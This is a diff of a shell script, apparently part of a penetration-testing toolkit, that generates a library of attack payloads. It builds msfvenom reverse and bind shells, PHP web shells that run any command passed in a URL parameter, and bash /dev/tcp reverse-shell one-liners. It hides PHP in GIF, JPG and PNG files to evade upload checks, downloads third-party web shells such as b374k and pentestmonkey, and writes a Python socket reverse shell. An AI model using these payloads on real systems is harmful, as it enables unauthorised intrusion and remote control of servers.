@@ -1,24 +1,42 @@
 # Reverse shell
+banner "payloads_common: shell_reverse_tcp.jsp"
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f raw > shell_reverse_tcp.jsp
+
+banner "payloads_common: shell_reverse_tcp.war"
 msfvenom -p java/shell/reverse_tcp LHOST=$ip_local LPORT=$port_local -f war > shell_reverse_tcp.war
 
+banner "payloads_common: shell_reverse_tcp.php"
 msfvenom -p php/reverse_php LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_tcp.php
 
-# msfvenom -p php/meterpreter_reverse_tcp LHOST=$port_local LPORT=$port_local -f raw > meterpreter_reverse_tcp.php
+banner "payloads_common: meterpreter_reverse_tcp.php"
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$port_local LPORT=$port_local -f raw > meterpreter_reverse_tcp.php
 
+banner "payloads_common: shell_reverse_unix.py"
 msfvenom -p cmd/unix/reverse_python LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.py
+
+banner "payloads_common: shell_reverse_unix.pl"
 msfvenom -p cmd/unix/reverse_perl LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.pl
+
+banner "payloads_common: shell_reverse_unix.sh"
 msfvenom -p cmd/unix/reverse_bash LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.sh
 
 # Bind shell
+banner "payloads_common: shell_bind_tcp.jsp"
 msfvenom -p java/jsp_shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f raw > shell_bind_tcp.jsp
+
+banner "payloads_common: shell_bind_tcp.war"
 msfvenom -p java/shell/bind_tcp LPORT=$port_remote -f war > shell_bind_tcp.war
 
+banner "payloads_common: shell_bind_tcp.php"
 msfvenom -p php/bind_php LPORT=$port_remote -f raw > shell_bind_tcp.php
 
-# msfvenom -p php/meterpreter_bind_tcp LPORT=$port_remote -f raw > meterpreter_bind_tcp.php
+banner "payloads_common: meterpreter_bind_tcp.php"
+msfvenom -p php/meterpreter_bind_tcp LPORT=$port_remote -f raw > meterpreter_bind_tcp.php
 
+banner "payloads_common: shell_bind_unix.py"
 msfvenom -p cmd/unix/bind_python LPORT=$port_remote -f raw > shell_bind_unix.py
+
+banner "payloads_common: shell_bind_unix.pl"
 msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl
 
 # exec only returns the last line of the generated output.
@@ -26,20 +44,24 @@ msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl
 # system immediately shows all output, and is used to show text.
 # passthru also returns output immediately, but is used for binary data. passthru displays raw data.
 
+banner "payloads_common: simple php shells"
 echo '<?php system($_GET["cmd"]); ?>' > system.php
 echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
 echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php
 
-wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
-
 echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
 echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
 
+banner "payloads_common: wpes.php - https://github.com/weaknetlabs/wpes"
+wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
+
+banner "payloads_common: gif with php"
 echo "GIF89;" > shell_exec.gif; cat shell_exec.php >> shell_exec.gif
 echo "GIF89;" > system.gif; cat system.php >> system.gif
 echo "GIF89;" > passthru.gif; cat passthru.php >> passthru.gif
 
 # https://github.com/aureooms/pixels
+banner "payloads_common: jpg with php"
 wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
 cp 1x1%23000000.jpg shell_exec.jpg
 exiftool -Comment="`cat shell_exec.php`" shell_exec.jpg
@@ -49,6 +71,7 @@ cp 1x1%23000000.jpg passthru.jpg
 exiftool -Comment="`cat passthru.php`" passthru.jpg
 rm 1x1%23000000.jpg
 
+banner "payloads_common: png with php"
 wget -N https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
 cp 1x1%23000000.png shell_exec.png
 exiftool -Comment="`cat shell_exec.php`" shell_exec.png
@@ -58,11 +81,13 @@ cp 1x1%23000000.png passthru.png
 exiftool -Comment="`cat passthru.php`" passthru.png
 rm 1x1%23000000.png
 
+banner "payloads_common: pentestmonkey-perl-reverse-shell.pl"
 rm pentestmonkey-perl-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
 sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-perl-reverse-shell.pl
 sed -i "s/1234/$port_local/g" pentestmonkey-perl-reverse-shell.pl
 
+banner "payloads_common: pentestmonkey-php-reverse-shell.pl"
 rm pentestmonkey-php-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
 sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-php-reverse-shell.pl
@@ -74,24 +99,30 @@ sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl
 
 
 if [ ! -f b374k.php ]; then
+    banner "payloads_common: b374k.php"
     wget https://github.com/b374k/b374k/archive/v3.2.3.zip
-    #TODO This fails sometimes due to API rate limiting
+    wget -N -O b374k.zip mimi https://github.com`curl https://github.com/b374k/b374k/releases | grep "archive" | grep "zip" | head -1 | cut -d "\"" -f2`
+    #Following call fails sometimes due to API rate limiting. Hence reading HTML. 
     #curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
     # | grep "zipball_url.*zip" \
     # | cut -d : -f 2,3 \
     # | tr -d \" \
     # | tr -d , \
     # | wget -qi -O b374k.zip -
-    unzip v3.2.3.zip -d b374k
-    rm v3.2.3.zip
-    cp b374k/b374k-3.2.3/b374k.* .
+    unzip b374k.zip
+    rm b374k.zip
+    mv b374k-* b374k
+    cp b374k/b374k.* .
     rm -rf b374k
 fi
 
+banner "payloads_common: automigrate.rc"
 echo "run post/windows/manage/migrate" > automigrate.rc
 
+banner "payloads_common: nodejsshell.py - https://github.com/ajinabraham/Node.Js-Security-Course"
 wget -N https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
 
+banner "payloads_common: revserse_shell.py"
 cat <<\EOT >revserse_shell.py
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
@@ -104,4 +135,4 @@ EOT
 
 sed -i "s/127.0.0.1/$ip_local/g" revserse_shell.py
 sed -i "s/4444/$port_local/g" revserse_shell.py
-# 
+
